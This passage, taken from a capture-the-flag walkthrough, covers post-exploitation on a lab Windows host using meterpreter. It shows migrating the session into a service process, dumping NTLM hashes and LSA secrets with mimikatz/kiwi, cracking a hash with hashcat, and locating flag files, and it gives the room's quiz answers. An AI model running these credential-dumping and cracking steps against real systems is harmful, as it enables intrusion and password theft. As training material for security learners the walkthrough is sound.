+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2240</span>  <span style="color:#ae81ff">2920</span>  powershell.exe        x86   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>yswow64<span style="color:#ae81ff">\W</span>indowsPowerShell<span style="color:#ae81ff">\v</span>1.0<span style="color:#ae81ff">\p</span>owershell.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2368</span>  <span style="color:#ae81ff">2240</span>  cmd.exe               x86   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWOW64<span style="color:#ae81ff">\c</span>md.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2396</span>  <span style="color:#ae81ff">564</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2404</span>  <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2556</span>  <span style="color:#ae81ff">564</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2572</span>  <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2604</span>  <span style="color:#ae81ff">712</span>   vds.exe               x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\v</span>ds.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2716</span>  <span style="color:#ae81ff">712</span>   SearchIndexer.exe     x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\S</span>earchIndexer.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2916</span>  <span style="color:#ae81ff">564</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2920</span>  <span style="color:#ae81ff">2400</span>  powershell.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\W</span>indowsPowerShell<span style="color:#ae81ff">\v</span>1.0<span style="color:#ae81ff">\p</span>owershell.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2996</span>  <span style="color:#ae81ff">2240</span>  cmd.exe               x86   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWOW64<span style="color:#ae81ff">\c</span>md.exe
+</span></span><span style="display:flex;"><span>meterpreter &gt; migrate <span style="color:#ae81ff">712</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migrating from <span style="color:#ae81ff">2240</span> to 712...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migration completed successfully.</span></span></code></pre></div></div>
+</div>
+
+<p>Yeah, migration was succesful, so we can dump the hashes of users passwords.</p>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465691828000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465691828000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465691828000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; hashdump
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+</span></span><span style="display:flex;"><span>meterpreter &gt; load kiwi
+</span></span><span style="display:flex;"><span>Loading extension kiwi...
+</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.2.0 <span style="color:#ae81ff">20191125</span> <span style="color:#f92672">(</span>x64/windows<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> .## ^ <span style="color:#75715e">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;## v ##&#39;</span>        Vincent LE TOUX            <span style="color:#f92672">(</span> vincent.letoux@gmail.com <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;#####&#39;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Success.
+</span></span><span style="display:flex;"><span>meterpreter &gt; lsa_dump_sam 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Running as SYSTEM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping SAM
+</span></span><span style="display:flex;"><span>Domain : JON-PC
+</span></span><span style="display:flex;"><span>SysKey : 55bd17830e678f18a3110daf2c17d4c7
+</span></span><span style="display:flex;"><span>Local SID : S-1-5-21-2633577515-2458672280-487782642
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SAMKey : c74ee832c5b6f4030dbbc7b51a011b1e
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000001f4 <span style="color:#f92672">(</span>500<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>User : Administrator
+</span></span><span style="display:flex;"><span>  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000001f5 <span style="color:#f92672">(</span>501<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>User : Guest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000003e8 <span style="color:#f92672">(</span>1000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>User : Jon
+</span></span><span style="display:flex;"><span>  Hash NTLM: ffb43f0de35be4d9917ac0cc8ad57f8d
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; lsa_dump_secrets 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Running as SYSTEM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping LSA secrets
+</span></span><span style="display:flex;"><span>Domain : JON-PC
+</span></span><span style="display:flex;"><span>SysKey : 55bd17830e678f18a3110daf2c17d4c7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Local name : Jon-PC <span style="color:#f92672">(</span> S-1-5-21-2633577515-2458672280-487782642 <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Domain name : WORKGROUP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Policy subsystem is : 1.11
+</span></span><span style="display:flex;"><span>LSA Key<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> : 1, default <span style="color:#f92672">{</span>888e8eec-afc6-d204-0da2-a847caf129ea<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>00<span style="color:#f92672">]</span> <span style="color:#f92672">{</span>888e8eec-afc6-d204-0da2-a847caf129ea<span style="color:#f92672">}</span> c3c1bfae498011d6dd37f2710cc970a5e2d80f0e17e6c12237abaaceed8ce04f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Secret  : DefaultPassword
+</span></span><span style="display:flex;"><span>old/text: CDCClubROX
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Secret  : DPAPI_SYSTEM
+</span></span><span style="display:flex;"><span>cur/hex : <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> dc <span style="color:#ae81ff">31</span> ac <span style="color:#ae81ff">35</span> e1 9a <span style="color:#ae81ff">18</span> b0 0b 5b <span style="color:#ae81ff">06</span> 6d e3 e8 da <span style="color:#ae81ff">89</span> 8b f8 da <span style="color:#ae81ff">71</span> fa ea <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">03</span> f4 2b <span style="color:#ae81ff">58</span> e1 a5 dd <span style="color:#ae81ff">35</span> ee <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">85</span> a9 <span style="color:#ae81ff">53</span> b1 c7 <span style="color:#ae81ff">95</span> 
+</span></span><span style="display:flex;"><span>    full: dc31ac35e19a18b00b5b066de3e8da898bf8da71faea7403f42b58e1a5dd35ee816185a953b1c795
+</span></span><span style="display:flex;"><span>    m/u : dc31ac35e19a18b00b5b066de3e8da898bf8da71 / faea7403f42b58e1a5dd35ee816185a953b1c795
+</span></span><span style="display:flex;"><span>old/hex : <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> c9 <span style="color:#ae81ff">22</span> d6 0b <span style="color:#ae81ff">83</span> 9e dd <span style="color:#ae81ff">98</span> a7 ad 7a 5a c5 ff 4e bb 8a d2 6f <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">61</span> be bf d4 bc <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">54</span> <span style="color:#ae81ff">70</span> fd df <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">12</span> a8 c5 e5 2d <span style="color:#ae81ff">98</span> 6c <span style="color:#ae81ff">79</span> <span style="color:#ae81ff">71</span> 
+</span></span><span style="display:flex;"><span>    full: c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f0161bebfd4bc705470fddf4612a8c5e52d986c7971
+</span></span><span style="display:flex;"><span>    m/u : c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f01 / 61bebfd4bc705470fddf4612a8c5e52d986c7971
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Secret  : NL$KM
+</span></span><span style="display:flex;"><span>cur/hex : <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">94</span> 4a <span style="color:#ae81ff">93</span> a2 9d d2 8e 2b cf 5f df <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">59</span> 4c e9 bc b8 <span style="color:#ae81ff">91</span> 2c <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">59</span> 1e bf <span style="color:#ae81ff">53</span> 1e <span style="color:#ae81ff">77</span> be c2 9b <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">04</span> b4 <span style="color:#ae81ff">56</span> ea 7d 6f ba c2 1b 7e f0 ba <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">67</span> e6 e6 <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">95</span> 1f <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">42</span> ee <span style="color:#ae81ff">34</span> 0a ee <span style="color:#ae81ff">99</span> 9f <span style="color:#ae81ff">55</span> </span></span></code></pre></div></div>
+</div>
+
+<p><strong>Within our elevated meterpreter shell, run the command &lsquo;hashdump&rsquo;. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</strong></p>
+<ul>
+<li>Jon</li>
+</ul>
+<p>Now we can crack the hashes. It doesn&rsquo;t care if we use <a href="https://www.openwall.com/john/">john-the-ripper</a> or <a href="https://hashcat.net/hashcat/">hashcat</a>.</p>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465693997000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465693997000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465693997000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#39;ffb43f0de35be4d9917ac0cc8ad57f8d&#39;</span> &gt; hashes.txt
+</span></span><span style="display:flex;"><span>$ hashcat -m <span style="color:#ae81ff">1000</span> -O hashes.txt /usr/local/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>Dictionary cache hit:                                                                    
+</span></span><span style="display:flex;"><span>* Filename..: /usr/local/share/wordlists/rockyou.txt                                     
+</span></span><span style="display:flex;"><span>* Passwords.: <span style="color:#ae81ff">14344384</span>                                                                   
+</span></span><span style="display:flex;"><span>* Bytes.....: <span style="color:#ae81ff">139921497</span>                                                                                                                                                           
+</span></span><span style="display:flex;"><span>* Keyspace..: <span style="color:#ae81ff">14344384</span>                                                                                                                                                            
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22                                                
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>Session..........: hashcat                                                                                                                                                        
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Type........: NTLM
+</span></span><span style="display:flex;"><span>Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
+</span></span><span style="display:flex;"><span>Time.Started.....: Fri Mar <span style="color:#ae81ff">20</span> 16:12:30 <span style="color:#ae81ff">2020</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">3</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time.Estimated...: Fri Mar <span style="color:#ae81ff">20</span> 16:12:33 <span style="color:#ae81ff">2020</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>/usr/local/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Speed.#2.........:  3946.0 kH/s <span style="color:#f92672">(</span>7.80ms<span style="color:#f92672">)</span> @ Accel:64 Loops:1 Thr:64 Vec:1
+</span></span><span style="display:flex;"><span>Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Salts
+</span></span><span style="display:flex;"><span>Progress.........: 10223616/14344384 <span style="color:#f92672">(</span>71.27%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Rejected.........: 0/10223616 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Point....: 10027008/14344384 <span style="color:#f92672">(</span>69.90%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span style="display:flex;"><span>Candidates.#2....: april669 -&gt; alisonodonnell1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Started: Fri Mar <span style="color:#ae81ff">20</span> 16:12:27 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>Stopped: Fri Mar <span style="color:#ae81ff">20</span> 16:12:34 <span style="color:#ae81ff">2020</span></span></span></code></pre></div></div>
+</div>
+
+<p><strong>Copy this password hash to a file and research how to crack it. What is the cracked password?</strong></p>
+<ul>
+<li>alqfna22</li>
+</ul>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465694829000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465694829000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465694829000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; cd C:/
+</span></span><span style="display:flex;"><span>meterpreter &gt; pwd
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>meterpreter &gt; ls
+</span></span><span style="display:flex;"><span>Listing: C:<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#f92672">============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode              Size     Type  Last modified              Name
+</span></span><span style="display:flex;"><span>----              ----     ----  -------------              ----
+</span></span><span style="display:flex;"><span>40777/rwxrwxrwx   <span style="color:#ae81ff">0</span>        dir   2009-07-14 05:18:56 +0200  $Recycle.Bin
+</span></span><span style="display:flex;"><span>40777/rwxrwxrwx   <span style="color:#ae81ff">0</span>        dir   2009-07-14 07:08:56 +0200  Documents and Settings
+</span></span><span style="display:flex;"><span>40777/rwxrwxrwx   <span style="color:#ae81ff">0</span>        dir   2009-07-14 05:20:08 +0200  PerfLogs
+</span></span><span style="display:flex;"><span>40555/r-xr-xr-x   <span style="color:#ae81ff">4096</span>     dir   2009-07-14 05:20:08 +0200  Program Files
+</span></span><span style="display:flex;"><span>40555/r-xr-xr-x   <span style="color:#ae81ff">4096</span>     dir   2009-07-14 05:20:08 +0200  Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>40777/rwxrwxrwx   <span style="color:#ae81ff">4096</span>     dir   2009-07-14 05:20:08 +0200  ProgramData
+</span></span><span style="display:flex;"><span>40777/rwxrwxrwx   <span style="color:#ae81ff">0</span>        dir   2018-12-13 04:13:22 +0100  Recovery
+</span></span><span style="display:flex;"><span>40777/rwxrwxrwx   <span style="color:#ae81ff">4096</span>     dir   2018-12-13 00:01:17 +0100  System Volume Information
+</span></span><span style="display:flex;"><span>40555/r-xr-xr-x   <span style="color:#ae81ff">4096</span>     dir   2009-07-14 05:20:08 +0200  Users
+</span></span><span style="display:flex;"><span>40777/rwxrwxrwx   <span style="color:#ae81ff">16384</span>    dir   2009-07-14 05:20:08 +0200  Windows
+</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">24</span>       fil   2018-12-13 04:47:39 +0100  flag1.txt
+</span></span><span style="display:flex;"><span>0000/---------    <span style="color:#ae81ff">3089184</span>  fif   1970-02-07 00:26:08 +0100  hiberfil.sys
+</span></span><span style="display:flex;"><span>0000/---------    <span style="color:#ae81ff">3089184</span>  fif   1970-02-07 00:26:08 +0100  pagefile.sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cat flag1.txt 
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>access_the_machine<span style="color:#f92672">}</span></span></span></code></pre></div></div>
+</div>
+
+<p><strong>Flag1? (Only submit the flag contents {CONTENTS})</strong></p>
+<ul>
+<li>access_the_machine</li>
+</ul>
+<p>For final steps, we return back to first session with basic command shell.</p>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465695787000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465695787000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465695787000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; 
+</span></span><span style="display:flex;"><span>Background session 2? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span>                                                    
+</span></span><span style="display:flex;"><span>msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; 
+</span></span><span style="display:flex;"><span>msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; sessions <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 1...                                             
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                                                               
+</span></span><span style="display:flex;"><span>                                                                               
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                       
+</span></span><span style="display:flex;"><span>Name             : ConsoleHost                                                 
+</span></span><span style="display:flex;"><span>Version          : 2.0                                                         
+</span></span><span style="display:flex;"><span>InstanceId       : 6ab0de61-c602-4a6d-93f5-77a4f1f1c239
+</span></span><span style="display:flex;"><span>UI               : System.Management.Automation.Internal.Host.InternalHostUserI 
+</span></span><span style="display:flex;"><span>                   nterface                                                    
+</span></span><span style="display:flex;"><span>CurrentCulture   : en-US          
+</span></span><span style="display:flex;"><span>CurrentUICulture : en-US                                                       
+</span></span><span style="display:flex;"><span>PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
+</span></span><span style="display:flex;"><span>IsRunspacePushed : False             
+</span></span><span style="display:flex;"><span>Runspace         : System.Management.Automation.Runspaces.LocalRunspace
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TJACJVXvCYTTfrcbvutJpyWlidgPcITh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;cd C:<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>cd C:<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\&gt;</span>dir flag* /s /p
+</span></span><span style="display:flex;"><span>dir flag* /s /p
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is E611-0B66
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>
+</span></span><span style="display:flex;"><span>03/17/2019  02:27 PM                <span style="color:#ae81ff">24</span> flag1.txt
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">24</span> bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\J</span>on<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\R</span>ecent
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>03/17/2019  02:26 PM               <span style="color:#ae81ff">482</span> flag1.lnk
+</span></span><span style="display:flex;"><span>03/17/2019  02:30 PM               <span style="color:#ae81ff">848</span> flag2.lnk
+</span></span><span style="display:flex;"><span>03/17/2019  02:32 PM             2,344 flag3.lnk
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">3</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>          3,674 bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\J</span>on<span style="color:#ae81ff">\D</span>ocuments
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>03/17/2019  02:26 PM                <span style="color:#ae81ff">37</span> flag3.txt
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">37</span> bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>03/17/2019  02:32 PM                <span style="color:#ae81ff">34</span> flag2.txt
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">34</span> bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     Total Files Listed:
